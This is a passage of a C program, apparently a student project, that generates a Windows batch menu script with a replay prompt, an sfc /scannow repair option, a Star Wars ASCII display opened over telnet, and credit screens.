	fprintf(arqWin,"ECHO DEU VELHA.												\n");
	fprintf(arqWin,"SET /P J=Deseja jogar novamente? (S/N):									\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"S\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"N\" EXIT										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"s\" GOTO xC										\n");
	fprintf(arqWin,"IF \"%%J%%\"==\"n\" EXIT										\n");//l2379


	fprintf(arqWin,":scanerror												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   +-------------------------------------------------------------------+				\n");
	fprintf(arqWin,"echo   ^|                                                                   ^|				\n");
	fprintf(arqWin,"echo   ^| Atencao! S¢ funciona para problemas gerados pelo pr¢prio Windows! ^|				\n");
	fprintf(arqWin,"echo   ^|                                                                   ^|				\n");
	fprintf(arqWin,"echo   +-------------------------------------------------------------------+				\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M:\"Iniciar\"										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :comx0									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :G										\n");

	fprintf(arqWin,":comx0													\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo  Comando: sfc /scannow										\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"sfc /scannow												\n");
	fprintf(arqWin,"pause													\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :G										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":starwars												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"echo                      .              .       .                    .      .				\n");
	fprintf(arqWin,"echo .        .               .       .     .            .						\n");
	fprintf(arqWin,"echo    .           .        .                     .        .            .				\n");
	fprintf(arqWin,"echo              .               .    .          .              .   .         .			\n");
	fprintf(arqWin,"echo                _________________       ____         __________					\n");
	fprintf(arqWin,"echo  .       .    /                 ^|    /   \\    .  ^|         \\					\n");
	fprintf(arqWin,"echo      .       /    ______   _____^| . /     \\      ^|    ___    ^|     .     .			\n");
	fprintf(arqWin,"echo             \\   \\    ^|   ^|       /   /\\ \\     ^|   ^|___^>   ^|				\n");
	fprintf(arqWin,"echo            . \\   \\   ^|   ^|      /   /__\\ \\  . ^|         _/             .			\n");
	fprintf(arqWin,"echo  .     ________^>    ^|  ^|   ^| . /        \\   ^|   ^|\\  \\_______    .			        \n");
	fprintf(arqWin,"echo       ^|            /   ^|   ^|    /    ______\\  ^|   ^|\\           ^|				\n");
	fprintf(arqWin,"echo       ^|___________/    ^|___^|   /____/      \\____\\^|___^| \\__________^|    .			\n");
	fprintf(arqWin,"echo   .     ____    __  . _____   ____      .  __________   .  _________				\n");
	fprintf(arqWin,"echo       \\   \\  / \\  /    /  /   \\       ^|         \\    /         ^|      .			\n");
	fprintf(arqWin,"echo        \\   \\/   \\/    /  /     \\      ^|    ___    ^|  /    ______^|  .			\n");
	fprintf(arqWin,"echo         \\              /  /   /\\ \\ .   ^|   ^|___^>   ^| \\   \\				\n");
	fprintf(arqWin,"echo    .     \\            /  /   /__\\ \\    ^|         _/.  \\   \\					\n");
	fprintf(arqWin,"echo           \\    /\\   /  /           \\   ^|   ^|\\  \\______^>    ^|   .				\n");
	fprintf(arqWin,"echo            \\  / \\  /  /    ______   \\  ^|   ^|\\              /          .			\n");
	fprintf(arqWin,"echo  .       .  \\/   \\/  /____/     \\___\\ ^|___^| \\____________/  LS				\n");
	fprintf(arqWin,"echo                                .									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   * Vers∆o ASCII o filme \"Star Wars Episodio IV\" (em ingles) *					\n");
	fprintf(arqWin,"echo.													\n");

	fprintf(arqWin,"choice /C SN /M \"Deseja assistir\"									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :starwars2									\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 goto :G										\n");

	fprintf(arqWin,":starwars2												\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"start telnet towel.blinkenlights.nl									\n");
	fprintf(arqWin,"echo      Art by Shanaka Dias										\n");
	fprintf(arqWin,"echo               __											\n");
	fprintf(arqWin,"echo    .-.__     \\ .-.  ___  __									\n");
	fprintf(arqWin,"echo    ^|_^|  '--.-.-(\\/\\;;\\_\\.-._______.-.							\n");
	fprintf(arqWin,"echo    (-)___ \\ \\ .-\\ \\;;\\(  \\      \\\\								\n");
	fprintf(arqWin,"echo     Y    '--._\\_((Q))\\;;\\\\.-\\     __(_)							\n");
	fprintf(arqWin,"echo     I           __'-' / .--.((Q))---'   \\,							\n");
	fprintf(arqWin,"echo     I     ___.-:   \\^|  ^|  \\'-'_         \\							\n");
	fprintf(arqWin,"echo     A  .-'     \\.-.\\  \\  \\\\ '--.__    '\\							\n");
	fprintf(arqWin,"echo     ^|  ^|____.---((Q))\\  \\__^|--\\_     \\     '						\n");
	fprintf(arqWin,"echo        ( )        '-' \\_  : \\-''--.___\\								\n");
	fprintf(arqWin,"echo         Y               \\ \\ \\      \\(_)							\n");
	fprintf(arqWin,"echo         I                \\ \\ \\        \\,							\n");
	fprintf(arqWin,"echo         I                 \\ \\ \\         \\							\n");
	fprintf(arqWin,"echo         A                  \\ \\ \\         '\\							\n");
	fprintf(arqWin,"echo         ^|              snd  \\ \\__^|           '							\n");
	fprintf(arqWin,"echo                              \\_:. \\								\n");
	fprintf(arqWin,"echo                                \\\\ \\								\n");
	fprintf(arqWin,"echo                                 \\\\ \\								\n");
	fprintf(arqWin,"echo                                 \\_\\_^|								\n");
	fprintf(arqWin,"echo.                                                                                                   \n");

	fprintf(arqWin,"choice /C SN /M:\"Retornar ao menu anterior\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :G										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":H													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"color 0F												\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo * Creditos *											\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Este script foi inspirado no software Insecuritynet, com os conhecimentos 			\n");
	fprintf(arqWin,"echo   obtidos nas aulas  curso BSI. 									\n");
	fprintf(arqWin,"echo.													\n");
	fprintf(arqWin,"echo   Para visualizar a grade curricular  curso, acesse:						\n");
	fprintf(arqWin,"echo   ^> iff.edu.br											\n");
	fprintf(arqWin,"echo.													\n");//l2479


	fprintf(arqWin,"choice /C SN /M \"Retornar ao menu principal\"								\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==1 goto :1x										\n");
	fprintf(arqWin,"IF %%ERRORLEVEL%%==2 exit										\n");

	fprintf(arqWin,":I													\n");
	fprintf(arqWin,"cls													\n");
	fprintf(arqWin,"ping 127.0.0.1 -n 2 > nul										\n");
	fprintf(arqWin,"echo. & echo. & echo. & echo.										\n");
	fprintf(arqWin,"echo          Sebastiao Alves de Almeida (UFF- TECNOLOGIA EM SISTEMA DE COMPUTACAO)			\n");
	fprintf(arqWin,"echo. & echo. & echo. & echo.										\n");
	fprintf(arqWin,"echo      #####  #####  #####  #####  #####  #####  #####  #####  #####					\n");
	fprintf(arqWin,"echo      #      #      #   #  #   #  #        #      #    #   #  #   #					\n");
	fprintf(arqWin,"echo      #####  #####  ####   #####  #####    #      #    #####  #####					\n");
	fprintf(arqWin,"echo          #  #      #   #  #   #      #    #      #    #   #  #   #					\n");
	fprintf(arqWin,"echo      #####  #####  #####  #   #  #####    #    #####  #   #  ##### 				\n");
	fprintf(arqWin,"echo. & echo. & echo. & echo.										\n");
	fprintf(arqWin,"echo              Arquitetura e Seguranca em Comunicacao de Dados					\n");
	fprintf(arqWin,"echo. & echo. & echo. & echo.										\n");
	fprintf(arqWin,"pause > nul												\n");
	fprintf(arqWin,"exit												        \n");//l2501


	fclose(arqWin);
	system("PAUSE");
	return 0;
}
